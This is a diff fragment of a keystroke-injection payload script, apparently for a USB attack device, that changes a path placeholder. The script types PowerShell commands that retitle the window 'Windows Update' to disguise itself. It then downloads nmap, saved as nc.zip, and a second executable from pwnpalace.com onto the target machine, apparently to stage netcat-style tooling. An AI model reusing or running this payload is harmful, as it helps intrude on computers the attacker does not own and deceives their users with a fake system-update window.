@@ -7,14 +7,14 @@ STRING $Host.UI.RawUI.WindowTitle = “Windows Update”
 DELAY 2000
 ENTER
 DELAY 2000
-STRING mkdir <PATH>
+STRING mkdir <PL_PATH>
 ENTER
 DELAY 2000
-STRING Invoke-WebRequest -Uri https://nmap.org/dist/nmap-7.80-win32.zip -Outfile <PATH>\nc.zip
+STRING Invoke-WebRequest -Uri https://nmap.org/dist/nmap-7.80-win32.zip -Outfile <PL_PATH>\nc.zip
 DELAY 2000
 ENTER
 DELAY 2000
-STRING Invoke-WebRequest -Uri http://pwnpalace.com/download/others/fce642c6-1963-4a0d-bffe-173f43f02329.zip -Outfile <PATH>\unzip.exe
+STRING Invoke-WebRequest -Uri http://pwnpalace.com/download/others/fce642c6-1963-4a0d-bffe-173f43f02329.zip -Outfile <PL_PATH>\unzip.exe
 ENTER
 DELAY 2000
 STRING cd <PATH>
